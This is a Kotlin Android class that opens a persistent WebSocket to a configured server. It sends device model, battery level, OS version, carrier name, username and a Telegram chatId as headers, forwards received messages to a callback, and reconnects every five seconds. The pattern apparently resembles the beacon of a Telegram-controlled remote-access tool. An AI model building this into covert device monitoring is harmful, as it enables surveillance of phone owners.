package com.kashem.shaikh.telegram

import android.content.Context
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.util.concurrent.TimeUnit
import com.kashem.shaikh.AppLogs

class WebSocketManager(
    private val context: Context,
    private val onMessage: (String) -> Unit,
    private val onConnectionChange: (Boolean) -> Unit
) {
    private val client = OkHttpClient.Builder().pingInterval(30, TimeUnit.SECONDS).build()
    private var webSocket: WebSocket? = null
    private var isConnected = false
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // সংযোগের স্টেট ট্র্যাক করুন – শুধু স্টেট চেঞ্জ হলে লগ করবেন
    private var lastLoggedState: Boolean? = null

    fun connect() {
        val urls = ConfigManager.getServerUrls(context)
        if (urls == null) {
            // কনফিগ না থাকলে একবার লগ করবেন, বারবার নয়
            if (lastLoggedState != false) {
                AppLogs.error("No config, cannot connect WebSocket")
                lastLoggedState = false
            }
            onConnectionChange(false)
            reconnectDelayed()
            return
        }
        val (_, socketUrl) = urls
        val username = urls.username
        val chatId = urls.chatId

        val request = Request.Builder().url(socketUrl)
            .addHeader("model", android.os.Build.MODEL)
            .addHeader("battery", getBatteryPercentage().toString())
            .addHeader("version", android.os.Build.VERSION.RELEASE)
            .addHeader("brightness", "unknown")
            .addHeader("provider", getNetworkProvider())
            .addHeader("username", username)
            .addHeader("chatId", chatId)
            .build()

        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                this@WebSocketManager.webSocket = webSocket
                isConnected = true
                onConnectionChange(true)
                // শুধু স্টেট চেঞ্জ হলে লগ
                if (lastLoggedState != true) {
                    AppLogs.logWebSocketConnection(true, "chatId=$chatId")
                    lastLoggedState = true
                }
            }
            override fun onMessage(webSocket: WebSocket, text: String) {
                AppLogs.debug("WebSocket received: $text")
                onMessage(text)
            }
            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
                isConnected = false
                onConnectionChange(false)
                if (lastLoggedState != false) {
                    AppLogs.logWebSocketConnection(false, "Closing: $reason")
                    lastLoggedState = false
                }
                reconnectDelayed()
            }
            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                onConnectionChange(false)
                // শুধু স্টেট চেঞ্জ হলে লগ, এবং বারবার একই error না লিখতে
                val errorMsg = t.message ?: "Unknown error"
                if (lastLoggedState != false) {
                    // থ্রটলিং AppLogs-এ ইতিমধ্যে আছে, তাই এখানে সরাসরি লগ করছি
                    AppLogs.logWebSocketConnection(false, errorMsg)
                    lastLoggedState = false
                }
                reconnectDelayed()
            }
        })
    }

    private fun reconnectDelayed() {
        scope.launch {
            delay(5000)
            webSocket?.close(1001, "Reconnecting")
            webSocket = null
            // রিকানেক্ট করার সময় লগ করবেন না (শুধু সংযোগ স্থাপিত হলে onOpen-এ লগ হবে)
            connect()
        }
    }

    fun disconnect() {
        scope.cancel()
        webSocket?.close(1000, "Manual disconnect")
        AppLogs.info("WebSocket disconnected manually")
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val bm = context.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    private fun getNetworkProvider(): String {
        return try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                tm.networkOperatorName.ifEmpty { "Unknown" }
            } else {
                "Permission denied"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }
}